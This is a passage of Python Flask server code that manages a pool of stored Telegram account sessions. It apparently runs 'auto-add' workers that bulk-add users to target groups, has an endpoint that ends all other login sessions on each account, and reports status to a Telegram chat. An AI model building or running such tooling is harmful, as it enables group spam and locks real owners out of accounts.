                        try:
                            await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                            terminated += 1
                        except:
                            pass
                return {'success': True, 'message': f'Terminated {terminated} sessions'}
            finally:
                await client.disconnect()
        
        result = SyncTelegramClient.run_async(terminate, timeout=30)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/account-age', methods=['POST'])
def account_age():
    try:
        aid = request.json.get('accountId')
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        # Check cached age
        if acc.get('account_age') and acc['account_age'].get('age_display'):
            if acc['account_age']['age_display'] not in ['Unknown account age', 'Error', '']:
                return jsonify({'success': True, 'account_age': acc['account_age'], 'cached': True})
        
        age = get_account_age_sync(acc['session'])
        
        # Update account
        acc['account_age'] = age
        for i, a in enumerate(accounts):
            if a['id'] == aid:
                accounts[i]['account_age'] = age
                break
        save_json(ACCOUNTS_FILE, accounts)
        
        return jsonify({'success': True, 'account_age': age, 'cached': False})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/send-report')
def send_report():
    send_telegram(
        f"<b>{SERVER_NAME}</b> Report\n"
        f"Today: {stats.get('today_added', 0)}\n"
        f"Total: {stats.get('total_added', 0)}\n"
        f"Active Workers: {len(running_tasks)}"
    )
    return jsonify({'success': True})

# ============================================
# BACKGROUND TASKS
# ============================================
def keep_alive():
    """Keep the server alive with periodic pings"""
    while True:
        time.sleep(240)  # 4 minutes
        try:
            requests.get(f"{SERVER_URL}/ping", timeout=10)
            logger.info("Keep-alive ping sent")
        except Exception as e:
            logger.error(f"Keep-alive error: {e}")

def restore_and_start():
    """Restore accounts and start workers on server startup"""
    time.sleep(5)
    
    logger.info(f"Restoring {len(accounts)} accounts...")
    
    for acc in accounts:
        if acc.get('session'):
            if check_account_auth(acc):
                # Refresh account age if missing
                if not acc.get('account_age') or not acc['account_age'].get('age_display'):
                    try:
                        age = get_account_age_sync(acc['session'])
                        acc['account_age'] = age
                        logger.info(f"Refreshed age for {acc.get('name')}: {age.get('age_display')}")
                    except Exception as e:
                        logger.error(f"Failed to refresh age: {e}")
                
                # Check if auto-add was enabled
                settings = auto_add_settings.get(str(acc['id']), {})
                if settings.get('enabled', True):
                    start_auto_add(acc)
            else:
                remove_dead_account(acc['id'], "Auth check failed on startup")
            time.sleep(2)
    
    # Update accounts file with refreshed ages
    save_json(ACCOUNTS_FILE, accounts)
    
    # Clean expired temp sessions
    current_time = time.time()
    expired = [sid for sid, data in temp_sessions.items() 
               if current_time - data.get('created_at', 0) > 3600]
    for sid in expired:
        del temp_sessions[sid]
    save_temp_sessions()
    
    send_telegram(f"<b>{SERVER_NAME}</b> Online!\nAPI ID: {API_ID}\nTargets: {', '.join(TARGET_GROUPS)}\nWorkers: {len(running_tasks)}")
    logger.info("Server startup complete")

# ============================================
# MAIN
# ============================================
if __name__ == '__main__':
    # Load data
    accounts.extend(load_json(ACCOUNTS_FILE, []))
    auto_add_settings.update(load_json(SETTINGS_FILE, {}))
    stats_data = load_json(STATS_FILE, {})
    if stats_data:
        stats.update(stats_data)
    worker_adds_data = load_json(WORKER_ADDS_FILE, {})
    if worker_adds_data:
        worker_adds.update(worker_adds_data)
    load_temp_sessions()
    
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║           AUTO-ADD SERVER #{SERVER_NUMBER} - {SERVER_NAME}                      ║
╠══════════════════════════════════════════════════════════════╣
║  API ID: {API_ID}                                                 ║
║  Targets: {', '.join(TARGET_GROUPS)}                    ║
║  Port: {PORT}                                                   ║
║  Features: Account Age Detection, Dual Groups, Stable Workers  ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Start background threads
    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=restore_and_start, daemon=True).start()
    
    # Run Flask
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
